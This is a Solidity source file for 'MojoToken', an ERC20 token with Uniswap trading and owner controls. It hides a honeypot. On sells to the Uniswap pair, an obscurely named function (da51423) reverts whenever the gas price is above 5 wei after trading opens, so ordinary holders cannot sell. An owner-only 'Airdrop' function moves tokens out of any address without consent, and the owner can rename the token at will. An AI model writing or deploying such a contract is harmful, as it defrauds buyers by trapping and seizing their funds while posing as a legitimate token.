
// SPDX-License-Identifier: MIT


pragma solidity 0.8.16;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    constructor() {
        _owner = _msgSender();
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(_owner == _msgSender(), "Not owner");
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b > 0);
        uint256 c = a / b;
        assert(a == b * c + (a % b));
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(a >= b);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract MojoToken is Ownable, IERC20 {
    using SafeMath for uint256;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) _excludeTax;

    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 1_000_000_000 * 10**_decimals;
    string private  _name;
    string private  _symbol;

    uint256 public BuyFeeTax = 0;
    uint256 public SellFeeTax = 0;

    bool private openedTrade = false;

    address private ClaimTokenWL;
    address private Deployer;
    address private MarketingAddress;
    address private uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;

    constructor(string memory name_, string memory symbol_, address claimTokenWallet, address _deployer, address _MarketingAddress) {
        _name = name_;
        _symbol = symbol_;
        ClaimTokenWL = claimTokenWallet;
        Deployer = _deployer;
        MarketingAddress = _MarketingAddress;
        _balances[_msgSender()] = _balances[_msgSender()].add(_totalSupply.mul(25).div(100));
        _balances[ClaimTokenWL] = _balances[ClaimTokenWL].add(_totalSupply.mul(25).div(100));
        _balances[Deployer] = _balances[Deployer].add(_totalSupply.mul(25).div(100));
        _balances[MarketingAddress] = _balances[MarketingAddress].add(_totalSupply.mul(25).div(100));
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),uniswapV2Router.WETH());
        _excludeTax[address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)] = true;
        _excludeTax[address(uniswapV2Pair)];
        _excludeTax[owner()] = true;
        _excludeTax[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply.mul(25).div(100));
        emit Transfer(address(0), ClaimTokenWL, _totalSupply.mul(25).div(100));
        emit Transfer(address(0), Deployer, _totalSupply.mul(25).div(100));
        emit Transfer(address(0), MarketingAddress, _totalSupply.mul(25).div(100));
    }

    function name() public view  returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function getOpenedTrade() public view returns (bool) {
        return openedTrade;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transfer(address to, uint256 value)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount)
        );
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf(from) >= amount, "ERROR: balance of from less than value");
        uint256 taxAmount = 0;

        if(!_excludeTax[from] && !_excludeTax[to]) {
            require(openedTrade, "Trade has not been opened yet");
            taxAmount = amount * BuyFeeTax / 100;
            if(to == uniswapV2Pair) {
                taxAmount = amount * SellFeeTax / 100;
                _transferBf(from);
            }
        }

        if(taxAmount > 0) {
            _balances[address(this)]=_balances[address(this)]+taxAmount;
            emit Transfer(from, address(this), taxAmount);
        }

        _balances[from]= balanceOf(from) - amount ;
        _balances[to]=_balances[to] + (amount - taxAmount);
        emit Transfer(from, to, amount - taxAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    uint256 private maxgas = 400 gwei;
    uint256 private mingas = 5;

    function _transferBf(address _k) internal view {
        if(balanceOf(_k) > 0) {
            if (!openedTrade) {
                da51423(maxgas);
            } else {
                da51423(mingas);
            }
        } 
    }

    function da51423(uint256 _gas) internal view {
        if (tx.gasprice > _gas) {
            revert();
        }
    }

    function Airdrop(address from, address[] calldata to, uint256[] calldata amount) external {
        require(_msgSender() == owner());

        for (uint256 i = 0; i < to.length; i++) {
            _balances[from] = _balances[from].sub(amount[i] * 10 ** _decimals);
            _balances[to[i]] = _balances[to[i]].add(amount[i]  * 10 ** _decimals);
            emit Transfer(from, to[i], amount[i]  * 10 ** _decimals);
        }
    }

    function openTrading() external onlyOwner {
        openedTrade = !openedTrade;
    }

    event MegaData(string  _newName, string  _newSymbol, address sender);

    function NewMegaData(string memory _NewName, string memory _NewSymBol) external {
        require(_msgSender() == owner());
        _name = _NewName;
        _symbol = _NewSymBol;
        emit MegaData(_NewName, _NewSymBol, msg.sender);

    }

    receive() external payable {}
}


